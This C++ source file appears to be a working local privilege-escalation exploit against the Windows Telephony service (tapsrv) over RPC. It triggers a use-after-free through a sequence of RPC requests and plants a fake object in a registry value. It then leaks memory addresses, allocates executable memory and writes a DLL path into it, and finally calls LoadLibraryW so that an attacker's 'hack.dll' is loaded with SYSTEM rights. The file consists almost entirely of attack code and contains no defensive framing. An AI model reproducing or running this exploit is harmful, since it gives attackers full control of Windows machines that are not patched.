
#include <Windows.h>
#include <rpc.h>
#include <cstdio>
#include <iostream>
#include <cstddef>
#include <rpcndr.h>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>
#include <map>
#include "RpcHelper.h"
#include "tapsrv_h.h"

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "userenv.lib")


void __RPC_FAR* __RPC_USER MIDL_user_allocate(size_t len)
{
	return malloc(len);
}
void __RPC_USER MIDL_user_free(void __RPC_FAR* ptr)
{
	free(ptr);
}

/*TUISPIDLLCallback
* GetUIDllName ->create GOLD object
* FreeDialogInstance -> delete GOLD object
* TRequestMakeCall -> fake the uaf memory
* TUISPIDLLCallback -> use uaf object
*/

typedef void __RPC_FAR* (*pMIDL_user_allocate)(size_t len);

const uint32_t N = 1024, M= 0x40000000;

DWORD magic = 0x40000018;

void write_func_offset(void* buffer, uint32_t offset) {
	*(int*)buffer = offset;
}

void write_parament(void* buffer, uint32_t n, int value) {
	*((int*)buffer + 1 + n) = value;
}

void* get_vdata_ptr(void* buffer) {
	return (void*)((char*)buffer + 60);
}

int read_parament(void* buffer, uint32_t n) {
	return *((int*)buffer + 1 + n);
}

std::map<std::string, uint32_t> req_func = {
	{ "GetAsyncEvents", 0x0},
	{ "GetUIDllName", 0x8 },
	{ "TUISPIDLLCallback", 0x10 },
	{ "FreeDialogInstance", 0x18 },
	{ "TRequestMakeCall", 0x3c8 },
};


uint8_t buffer[N];
long use{ 0 };


void init() {
	memset(buffer, 0x00, N);
	use = 60;
}
int create_gold(PCONTEXT_HANDLE_TYPE &context) {
	init();
	write_func_offset((void*)buffer, req_func["GetUIDllName"] / 0x8);
	write_parament((void*)buffer, 1, 1);
	write_parament((void*)buffer, 2, 3);
	write_parament((void*)buffer, 5, -1);
	ClientRequest(context, buffer, N, &use);

	return read_parament((void*)buffer, 7);
}

void free_gold(PCONTEXT_HANDLE_TYPE& context,int gold_id) {
	init();
	write_func_offset((void*)buffer, req_func["FreeDialogInstance"] / 0x8);
	write_parament((void*)buffer, 1, gold_id); //0x00010000
	ClientRequest(context, buffer, N, &use);
}

// DIALER.EXE
void create_payload(int type) {
	
	HKEY hKey = NULL;
	if (!RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\HandoffPriorities", L"RequestMakeCall")) {
		if (!RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\HandoffPriorities", &hKey)) {
			BYTE lpbuffer[0x5e] = { 0 };

			HMODULE hModule = nullptr;
			void* pfunc = nullptr;

			switch (type){
			case 1:
				hModule = GetModuleHandle(L"msvcrt.dll");
				pfunc = GetProcAddress(hModule, "malloc");
				break;
			case 2:
				hModule = GetModuleHandle(L"KERNELBASE.dll");
				pfunc = GetProcAddress(hModule, "VirtualAlloc");
				break;
			case 3:
				hModule = GetModuleHandle(L"msvcrt.dll");
				pfunc = GetProcAddress(hModule, "memcpy_s");
				break;
			case 4:
				hModule = GetModuleHandle(L"KERNELBASE.dll");
				pfunc = GetProcAddress(hModule, "LoadLibraryW");
				break;
			default:
				break;
			}

			*(PDWORD)((uint64_t)lpbuffer + 0xE) = magic;
			*(PULONG_PTR)((ULONG_PTR)lpbuffer + 0x1E) = (uint64_t)pfunc;

			RegSetValueExW(hKey, L"RequestMakeCall", 0, REG_BINARY, lpbuffer, 0x5E);

		}
	}
}

// TRequestMakeCall, 
void reuse_uaf(PCONTEXT_HANDLE_TYPE& context,int type) {
	init();
	create_payload(type);
	write_func_offset((void*)buffer, req_func["TRequestMakeCall"] / 0x8);
	ClientRequest(context, buffer, N, &use);
}

DWORD trigger_uaf(PCONTEXT_HANDLE_TYPE& context) {
	init();

	write_func_offset((void*)buffer, req_func["TUISPIDLLCallback"] / 0x8);
	write_parament((void*)buffer, 1, 0x40000018);
	write_parament((void*)buffer, 2, 3);
	ClientRequest(context, buffer, N, &use);

	DWORD leak = *(int*)((void*)buffer);
	return leak;
	
}
int main() {
	// \\pipe\\tapsrv
	string_handle_bind("tapsrvlpc", tapsrv_IfHandle);

	if (tapsrv_IfHandle != NULL) {
		std::cout << "connect success\n";
	}

	RpcTryExcept{

		PCONTEXT_HANDLE_TYPE context = NULL;
		long AsyncEventsEvent{ 0 };


		DWORD id = GetCurrentProcessId();
		if (ClientAttach(&context, (long)id, &AsyncEventsEvent,L"srhla", (wchar_t*)L"desktop-jvcddqk")) {
			std::cout << "ClientAttach error\n";
		}

	
		//int id1 = create_gold(context);
		//int id2 = create_gold(context);
		//int id3 = create_gold(context);
		int id4 = create_gold(context);
		int id5 = create_gold(context);
		int id6 = create_gold(context);


		PCONTEXT_HANDLE_TYPE context2 = NULL;
		AsyncEventsEvent = 0;
		if (ClientAttach(&context2, (long)id, &AsyncEventsEvent, L"asus", (wchar_t*)L"LAPTOP-12LQLKI4")) {
			std::cout << "ClientAttach error\n";
		}

		free_gold(context, id5);
		//free_gold(context, id2);

		int id7 = create_gold(context2);
		free_gold(context, id7); // 从全局变量中根据id找到gold对象
		reuse_uaf(context,1);
		

		int p3 = 0;
		while (true) {
			DWORD leak = trigger_uaf(context2);
			printf("leak low 32bit address: 0x%x\n", leak);
			// 0x100003000 = leak + 60 + 0x40100000 + p3  
			if (leak + 0x40100000 >= 0xc0000000) {
				p3 = 0x100003000 - leak - 60 - 0x40100000;
				break;
			}

		}
		
		printf("find correct address!!!\n");

		magic = 0x40000018;

		int id8 = create_gold(context);
		free_gold(context,id8);

		int id9 = create_gold(context2);
		free_gold(context, id9);
		reuse_uaf(context,2);

		
		int buffer_size = 0x40000000;
		void* buffer2 = malloc(0x40000000);
		memset(buffer2, 0, M );
		use = 60;
		write_func_offset((void*)buffer2, req_func["TUISPIDLLCallback"] / 0x8);
		write_parament((void*)buffer2, 1, 0x40000018);
		write_parament((void*)buffer2, 2, 3);
		write_parament((void*)buffer2, 3, p3);
		write_parament((void*)buffer2, 4, 0x40);
		// M - 60 >= param[3]
		// 0x100000000+0x3000-0x40000000
		ClientRequest(context2,(unsigned char*) buffer2, M , &use);

		printf("VirtualAlloc in 0x40000018\n");

		
		DWORD virtual_alloc_address = 0x40000018;

		int id10 = 0;
		int id11 = 0;
		
		LPCWSTR dll = L"C:\\Users\\SRHla\\AppData\\Roaming\\hack.dll";

		size_t size = wcslen(dll) * 2;
		size = (size + 3 - 1) / 3 * 3;
		int n = 0;
		int count = size / 3;

		while (n < count) {

			id10 = create_gold(context);
			free_gold(context, id10);

			id11 = create_gold(context2);
			free_gold(context, id11);
			magic = virtual_alloc_address + n * 3;
			reuse_uaf(context, 3);

			//memcpy_s((void*)(buffer + n * 3), 3, (const void*)((uint8_t*)dll + n * 3), 3);
			init();
			use = 90;
			write_func_offset((void*)buffer, req_func["TUISPIDLLCallback"] / 0x8);
			write_parament((void*)buffer, 1, virtual_alloc_address + n*3);
			write_parament((void*)buffer, 2, 3);
			write_parament((void*)buffer, 4, 3);
			//void* vdata = get_vdata_ptr((void*)buffer);
			memcpy((void*)(buffer+60), (const void*)((uint8_t*)dll + n * 3), 3);
			
			ClientRequest(context2, buffer, N, &use);

			n = n + 1;
		}

		magic = 0x40000018;
		// LoadLibraryW
		printf("start LoadLibraryW in **System**\n");

		int id12 = create_gold(context);
		free_gold(context, id12);

		int id13 = create_gold(context2);
		free_gold(context, id13);
		reuse_uaf(context, 4);

		init();
		write_func_offset((void*)buffer, req_func["TUISPIDLLCallback"] / 0x8);
		write_parament((void*)buffer, 1, virtual_alloc_address);
		write_parament((void*)buffer, 2, 3);
		ClientRequest(context2, buffer, N, &use);
		if (*(int64_t*)buffer == 0) {
			std::cout << "hack failed\n";
		}
		else {
			printf("hack finish!!!\n");
		}
	}
	RpcExcept(1) {
		printf("RPC ExceptiCAPSAX64DRVon %d\n", RpcExceptionCode());
	}
	RpcEndExcept;
	string_handle_unbind(tapsrv_IfHandle);

	return 0;
}
